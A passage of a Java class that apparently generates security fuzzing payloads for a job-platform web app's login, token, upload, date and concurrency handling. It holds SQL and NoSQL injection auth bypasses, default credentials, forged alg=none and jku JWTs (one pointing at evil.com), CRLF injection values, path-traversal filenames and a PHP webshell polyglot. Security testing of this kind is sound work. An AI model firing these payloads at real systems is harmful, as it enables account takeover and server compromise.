        logins.put(new JSONObject().put("username", "Admin").put("password", "Password123"));    // case
        logins.put(new JSONObject().put("username", "ADMIN").put("password", "Password123"));
        logins.put(new JSONObject().put("username", "admin").put("password", "PASSWORD123"));

        // Trailing null byte (truncation)
        logins.put(new JSONObject().put("username", "admin\u0000").put("password", "Password123"));
        logins.put(new JSONObject().put("username", "admin").put("password", "Password123\u0000"));
        logins.put(new JSONObject().put("username", "admin").put("password", "wrong\u0000Password123"));

        // Type confusion
        logins.put(new JSONObject().put("username", true).put("password", true));
        logins.put(new JSONObject().put("username", 1).put("password", 1));
        logins.put(new JSONObject().put("username", new JSONArray()).put("password", new JSONArray()));
        logins.put(new JSONObject().put("username", new JSONObject()).put("password", new JSONObject()));

        // SQL injection auth bypass
        String[] sqliBypass = {
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR '1'='1' --",
                "' OR 1=1--",
                "' OR 1=1 LIMIT 1--",
                "admin') OR ('1'='1",
                "admin' UNION SELECT 1,'admin','password',1--",
                "' OR EXISTS(SELECT * FROM users)--",
                "' OR 'x'='x",
                "x' OR username LIKE 'admin%'--",
                "admin'; --",
                "\\' OR \\'1\\'=\\'1",
        };
        for (String s : sqliBypass) {
            logins.put(new JSONObject().put("username", s).put("password", s));
            logins.put(new JSONObject().put("username", "admin").put("password", s));
            logins.put(new JSONObject().put("username", s).put("password", "anything"));
        }

        // NoSQL operator smuggling
        logins.put(new JSONObject()
                .put("username", new JSONObject().put("$ne", JSONObject.NULL))
                .put("password", new JSONObject().put("$ne", JSONObject.NULL)));
        logins.put(new JSONObject()
                .put("username", new JSONObject().put("$gt", ""))
                .put("password", new JSONObject().put("$gt", "")));
        logins.put(new JSONObject()
                .put("username", "admin")
                .put("password", new JSONObject().put("$ne", JSONObject.NULL)));
        logins.put(new JSONObject()
                .put("username", "admin")
                .put("password", new JSONObject().put("$regex", ".*")));

        // Common credential stuffing
        String[][] creds = {
                {"admin", "admin"}, {"admin", "password"}, {"admin", "12345"},
                {"administrator", "administrator"}, {"root", "root"}, {"root", "toor"},
                {"test", "test"}, {"guest", "guest"}, {"user", "user"},
                {"sa", ""}, {"postgres", "postgres"}, {"oracle", "oracle"},
                {"admin", ""}, {"", ""}, {"", "password"},
        };
        for (String[] c : creds) {
            logins.put(new JSONObject().put("username", c[0]).put("password", c[1]));
        }

        // Brute force markers (use timing to detect rate-limit gaps)
        for (int k = 0; k < 100; k++) {
            logins.put(new JSONObject()
                    .put("username", "admin")
                    .put("password", "guess" + k));
        }

        // Mass assignment in login
        logins.put(new JSONObject()
                .put("username", "admin")
                .put("password", "Password123")
                .put("role", "ADMIN")
                .put("isAdmin", true)
                .put("authenticated", true)
                .put("loggedIn", true));

        // CRLF in credentials
        logins.put(new JSONObject()
                .put("username", "admin\r\nX-Forwarded-For: 127.0.0.1")
                .put("password", "Password123"));

        // ReDoS bait (if username is regex-validated)
        logins.put(new JSONObject()
                .put("username", "a".repeat(50) + "!")
                .put("password", "Password123"));
        logins.put(new JSONObject()
                .put("username", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!")
                .put("password", "Password123"));

        return logins;
    }

    // ====================================================================
    //  AUTHENTICATION TOKENS / HEADERS
    // ====================================================================

    /**
     * Token / header values to fuzz Authorization headers, refresh endpoints,
     * password-reset flows, and anything that consumes a JWT or opaque token.
     */
    public JSONArray getMaliciousAuthTokens() throws JSONException {
        JSONArray tokens = new JSONArray();

        tokens.put(new JSONObject().put("token", JSONObject.NULL));
        tokens.put(new JSONObject().put("token", ""));
        tokens.put(new JSONObject().put("token", "Bearer "));
        tokens.put(new JSONObject().put("token", "Bearer null"));
        tokens.put(new JSONObject().put("token", "Bearer undefined"));
        tokens.put(new JSONObject().put("token", "null"));
        tokens.put(new JSONObject().put("token", "undefined"));

        // alg=none JWT (header is {"alg":"none","typ":"JWT"}, payload claims admin, no signature)
        tokens.put(new JSONObject().put("token",
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
                        + "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiIsImV4cCI6OTk5OTk5OTk5OX0."));

        // Weak HMAC secret (this is signed with HS256 + secret "secret")
        tokens.put(new JSONObject().put("token",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                        + "eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9."
                        + "X8KZsP6wp9Ix9_wLKhGqmGvAp8sDmkyBkF6gmM5q2yI"));

        // Truncated / malformed JWT
        tokens.put(new JSONObject().put("token", "eyJhbGciOiJIUzI1NiJ9"));
        tokens.put(new JSONObject().put("token", "..."));
        tokens.put(new JSONObject().put("token", "a.b.c"));
        tokens.put(new JSONObject().put("token", "not.a.jwt.at.all"));

        // kid path traversal
        tokens.put(new JSONObject().put("token",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0."
                        + "eyJzdWIiOiJhZG1pbiJ9."
                        + "AAAA"));

        // jku/x5u SSRF
        tokens.put(new JSONObject().put("token",
                "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9ldmlsLmNvbS9qd2tzLmpzb24ifQ."
                        + "eyJzdWIiOiJhZG1pbiJ9."
                        + "AAAA"));

        // Header-injection styled tokens
        tokens.put(new JSONObject().put("token", "valid_token\r\nX-Admin: true"));
        tokens.put(new JSONObject().put("token", "valid_token\nLocation: http://evil.com"));

        // SQL/NoSQL in token (in case it's looked up directly)
        tokens.put(new JSONObject().put("token", "' OR '1'='1"));
        tokens.put(new JSONObject().put("token", "{\"$ne\":null}"));

        // Huge token
        tokens.put(new JSONObject().put("token", "Bearer " + "A".repeat(100_000)));

        // Stolen-token markers (replay)
        tokens.put(new JSONObject()
                .put("token", "previously_used_token")
                .put("replay", true)
                .put("originalIp", "10.0.0.1"));

        // Expired token
        tokens.put(new JSONObject().put("token",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                        + "eyJzdWIiOiJhZG1pbiIsImV4cCI6MTAwMDAwMDAwMH0." // exp in 2001
                        + "AAAA"));

        // Future-dated token (nbf in the future)
        tokens.put(new JSONObject().put("token",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                        + "eyJzdWIiOiJhZG1pbiIsIm5iZiI6OTk5OTk5OTk5OX0."
                        + "AAAA"));

        return tokens;
    }

    // ====================================================================
    //  JSON PARSER STRESS
    // ====================================================================

    public List<JSONObject> getJsonParserStressPayloads() throws JSONException {
        List<JSONObject> payloads = new ArrayList<>();

        // Deeply nested object (stack overflow bait)
        JSONObject deep = new JSONObject();
        JSONObject cursor = deep;
        for (int k = 0; k < 5000; k++) {
            JSONObject next = new JSONObject();
            cursor.put("n", next);
            cursor = next;
        }
        cursor.put("end", true);
        payloads.add(new JSONObject().put("payload", deep).put("kind", "deepNestedObject"));

        // Deeply nested array
        JSONArray deepArr = new JSONArray();
        JSONArray ac = deepArr;
        for (int k = 0; k < 5000; k++) {
            JSONArray next = new JSONArray();
            ac.put(next);
            ac = next;
        }
        payloads.add(new JSONObject().put("payload", deepArr).put("kind", "deepNestedArray"));

        // Huge flat array
        JSONArray bigArr = new JSONArray();
        for (int k = 0; k < 100_000; k++) bigArr.put(k);
        payloads.add(new JSONObject().put("payload", bigArr).put("kind", "hugeArray"));

        // Many keys
        JSONObject manyKeys = new JSONObject();
        for (int k = 0; k < 50_000; k++) manyKeys.put("key" + k, k);
        payloads.add(new JSONObject().put("payload", manyKeys).put("kind", "manyKeys"));

        // Duplicate keys (raw)
        String dup = "{" + "\"a\":1,".repeat(10_000) + "\"a\":\"final\"}";
        payloads.add(new JSONObject().put("rawJson", dup).put("kind", "duplicateKeys"));

        // Massive string value
        payloads.add(new JSONObject()
                .put("payload", new JSONObject().put("blob", "X".repeat(5_000_000)))
                .put("kind", "hugeString"));

        return payloads;
    }

    // ====================================================================
    //  DATE / TIME EDGE CASES
    // ====================================================================

    public JSONArray getBadDateData() throws JSONException {
        JSONArray dates = new JSONArray();

        String[] bad = {
                "",
                "not-a-date",
                "2025-13-45",                     // bad month/day
                "2025-02-30",                     // Feb 30
                "0000-00-00",
                "9999-12-31",
                "1970-01-01T00:00:00Z",           // epoch
                "1969-12-31T23:59:59Z",           // pre-epoch (signed-time bugs)
                "-0001-01-01",
                "2038-01-19T03:14:08Z",           // Y2038 boundary
                "10000-01-01",                    // year > 9999
                "2025-02-29",                     // not a leap year
                "2024-02-29",                     // valid leap, sometimes mis-handled
                "2025-12-31T24:00:00Z",           // hour 24
                "2025-12-31T23:60:00Z",           // minute 60
                "2025-12-31T23:59:60Z",           // leap second
                "2025-03-09T02:30:00-05:00",      // DST gap (US)
                "2025-11-02T01:30:00-05:00",      // DST overlap
                "next tuesday",
                "tomorrow",
                "<script>alert(1)</script>",
                "' OR 1=1--",
                "0",
                "-1",
                "Infinity",
        };
        for (String d : bad) dates.put(new JSONObject().put("date", d));

        // Numeric epoch variants
        dates.put(new JSONObject().put("date", 0));
        dates.put(new JSONObject().put("date", -1));
        dates.put(new JSONObject().put("date", Long.MAX_VALUE));
        dates.put(new JSONObject().put("date", Long.MIN_VALUE));
        dates.put(new JSONObject().put("date", 253402300800L)); // year 10000
        dates.put(new JSONObject().put("date", JSONObject.NULL));

        return dates;
    }

    // ====================================================================
    //  FILE UPLOAD METADATA (if your app accepts uploads)
    // ====================================================================

    public JSONArray getBadFileUploadMetadata() throws JSONException {
        JSONArray files = new JSONArray();

        String[] names = {
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\cmd.exe",
                "shell.php",
                "shell.php.jpg",
                "shell.jpg.php",
                "shell.pHp",
                "shell.php\u0000.jpg",   // null-byte extension bypass
                "shell.php%00.jpg",
                ".htaccess",
                "web.config",
                "shell.jsp",
                "shell.jspx",
                "shell.aspx",
                "shell.exe",
                "shell.bat",
                "shell.sh",
                "CON", "PRN", "NUL", "COM1", "LPT1", // Windows reserved
                "",
                "a".repeat(300) + ".jpg",
                "file with spaces.jpg",
                "файл.jpg",
                "🖼️.jpg",
                "<script>.jpg",
                "file.jpg;.php",
                "file.jpg/../../shell.php",
                "../../../../var/www/html/shell.php",
        };
        String[] mimes = {
                "image/jpeg", "image/png", "text/html", "application/x-php",
                "application/octet-stream", "application/javascript",
                "image/svg+xml", // SVG can carry JS
                "application/x-msdownload",
                "", "INVALID/MIME", "image/jpeg\r\nX-Injected: true",
        };
        long[] sizes = { 0L, 1L, -1L, Long.MAX_VALUE, 5L * 1024 * 1024 * 1024 };

        for (String n : names) {
            for (String m : mimes) {
                for (long s : sizes) {
                    files.put(new JSONObject()
                            .put("filename", n)
                            .put("mimeType", m)
                            .put("sizeBytes", s));
                }
            }
        }

        // Polyglot-style metadata
        files.put(new JSONObject()
                .put("filename", "innocent.jpg")
                .put("mimeType", "image/jpeg")
                .put("sizeBytes", 1024)
                .put("declaredContent", "GIF89a;<?php system($_GET['c']); ?>"));

        return files;
    }

    // ====================================================================
    //  CONCURRENCY / RACE-CONDITION MARKERS
    //  Use these in parallel test runs to flush out TOCTOU and double-spend.
    // ====================================================================

    public JSONArray getRaceConditionPayloads(String username) throws JSONException {
        JSONArray races = new JSONArray();

        // Fire the same registration twice (uniqueness race)
        for (int k = 0; k < 2; k++) {
            races.put(new JSONObject()
                    .put("username", "raceUser_" + System.currentTimeMillis())
                    .put("email", "race@test.com")
                    .put("password", "Password123")
                    .put("attempt", k));
        }

        // Apply the same coupon / one-time token N times
        for (int k = 0; k < 50; k++) {
            races.put(new JSONObject()
                    .put("action", "redeemCoupon")
                    .put("couponCode", "ONE_TIME_USE_ONLY")
                    .put("username", username)
                    .put("attempt", k));
        }

        // Withdraw the same balance from parallel sessions
        for (int k = 0; k < 20; k++) {
            races.put(new JSONObject()
                    .put("action", "withdraw")
                    .put("amount", 100)
                    .put("username", username)
                    .put("sessionId", "session-" + k));
        }

        return races;
    }

    // ====================================================================
    //  MASTER FIRE-EVERYTHING METHOD
    // ====================================================================

    /**
     * Returns a single mega-array of every malicious payload across every
     * category, tagged with its source method, so you can iterate once and
     * fire it at every endpoint to see what sticks.
     */
    public JSONArray getEverythingBadEverywhere(String companyId, String creatorUsername)
            throws JSONException {
        JSONArray everything = new JSONArray();

        for (JSONObject o : getBadUserRegistrationData())
            everything.put(new JSONObject().put("source", "user").put("payload", o));
        for (JSONObject o : getBadEmployerRegistrationData())
            everything.put(new JSONObject().put("source", "employer").put("payload", o));
        JSONArray staff = getBadStaffRegistrationData(companyId);
        for (int k = 0; k < staff.length(); k++)
            everything.put(new JSONObject().put("source", "staff").put("payload", staff.getJSONObject(k)));
        for (JSONObject o : getBadCompanyData(creatorUsername))
            everything.put(new JSONObject().put("source", "company").put("payload", o));
        JSONArray logins = getBadLoginData();
        for (int k = 0; k < logins.length(); k++)
            everything.put(new JSONObject().put("source", "login").put("payload", logins.getJSONObject(k)));
        JSONArray tokens = getMaliciousAuthTokens();
        for (int k = 0; k < tokens.length(); k++)
            everything.put(new JSONObject().put("source", "token").put("payload", tokens.getJSONObject(k)));
        for (JSONObject o : getJsonParserStressPayloads())
            everything.put(new JSONObject().put("source", "jsonStress").put("payload", o));
        JSONArray dates = getBadDateData();
        for (int k = 0; k < dates.length(); k++)
            everything.put(new JSONObject().put("source", "date").put("payload", dates.getJSONObject(k)));
        JSONArray files = getBadFileUploadMetadata();
        for (int k = 0; k < files.length(); k++)
            everything.put(new JSONObject().put("source", "file").put("payload", files.getJSONObject(k)));
        JSONArray races = getRaceConditionPayloads(creatorUsername);
        for (int k = 0; k < races.length(); k++)
            everything.put(new JSONObject().put("source", "race").put("payload", races.getJSONObject(k)));

        return everything;
    }
}